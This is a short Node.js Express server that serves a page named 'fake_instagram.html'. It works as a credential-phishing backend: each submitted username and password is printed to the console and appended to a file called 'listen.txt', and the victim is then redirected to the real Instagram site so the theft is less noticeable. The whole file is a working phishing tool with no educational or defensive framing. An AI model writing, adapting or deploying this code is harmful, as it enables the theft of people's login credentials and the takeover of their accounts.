
const express = require("express");
const bodyParser = require("body-parser");
const request = require("request");
const app = express();
const fs = require("fs");
app.use(express.static(__dirname + "/public"));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", function (req, res) {
  res.sendFile("public/fake_instagram.html", { root : __dirname});
});

app.post("/", function (req, res) {
  console.log(req.body.user);
  console.log(req.body.password)
  let data =  req.body.user + " " + req.body.password + "\n"
  
  fs.appendFile('listen.txt', data, function (err) {
    if (err) return console.log(err);
  });
  res.redirect('https://www.instagram.com/')

});

app.listen("3000", function (req, res) {
  console.log("listenning on port 3000");
});